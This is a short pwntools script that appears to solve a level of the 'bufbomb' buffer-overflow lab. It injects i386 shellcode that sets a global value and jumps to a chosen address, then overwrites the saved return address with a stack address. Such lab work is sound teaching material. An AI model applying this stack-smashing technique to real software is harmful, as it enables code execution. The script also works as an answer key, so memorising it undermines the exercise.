from pwn import *

elf = ELF("./bufbomb")
context.arch = 'i386'
p = elf.process(['-u20521859'])

shellcode = asm('''
    mov  dword ptr [0x80049160], 0x2b23d2da
    push 0x800442a9
    ret
''')
payload = shellcode
payload += b"A"*(44-len(shellcode))
payload += p32(0x55683a98)


p.sendline(payload)
p.interactive()
